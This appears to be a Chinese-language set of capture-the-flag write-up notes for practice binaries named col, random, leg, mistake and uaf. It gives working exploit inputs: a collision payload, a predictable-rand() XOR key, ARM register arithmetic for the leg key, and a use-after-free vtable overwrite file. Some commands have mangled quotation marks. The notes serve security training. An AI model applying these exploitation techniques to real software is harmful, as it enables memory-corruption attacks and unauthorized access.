python -c ‘print 4“\xc9\xce\xc5\x06”+”\xc8\xce\xc5\x06”‘ | xargs ./col

random

由于C语言中的随机数是伪随机数,而默认的随机数种子为1可以求出rand()的值(由于RAND_MAX的不同windows和linux尽管随机数种子默认均为1但是值不同)
1804289383^0xdeadbeef=3039230856

#include <stdio.h>
#include <stdlib.h>
int main(int argc, char const *argv[])
{
unsigned int random1;
random1 = rand();
printf("No srand():\n");
printf("random1 = %u\n", random1);
unsigned int random2;
srand(1);
random2 = rand();
printf("srand(1):\n");
printf("random2 = %u\n", random2);
unsigned int random3;
srand(2);
random3 = rand();
printf("srand(2):\n");
printf("random3 = %u\n", random3);
return 0;
}

leg

这个主要是读汇编 找到三个key函数返回值相加即可
pc 保存当前代码地址+8
lr保存的是函数返回地址
key1=0x8cdc+0x8
key2=0x8d04+0x4+0x4
key3=0x8d80

key=key1+key2+key3
key=108400
注意:key2中转换为Thumb 指令同时pc 为当前地址+4

mistake

这题很有意思
fd是open返回值和0的大小比较结果,因为不会返回比0小的数所以fd的值为0
read(fd,pw_buf,PW_LEN)
这里的read是我们输入的因此只要满足每个字符和1异或等于第一次输入的数就可以
例如0000000001 和1111111110 又或者0000000000 11111111111

uaf

read(open(argv[2], O_RDONLY), data, len); //从文件中读取数据 放入data

只要修改这八个字节-8即可
0x401570-0x8=0x401568->\x68\x15\x40\x00\x00\x00\x00\x00
python -c “print \x68\x15\x40\x00\x00\x00\x00\x00” > “666.txt”
这里要注意的是先释放的空间后申请先申请的后释放
在服务器执行python -c “print ‘\x68\x15\x40\x00\x00\x00\x00\x00’” > “/tmp/666.txt”
同理 0x401588 0x401548 也可以
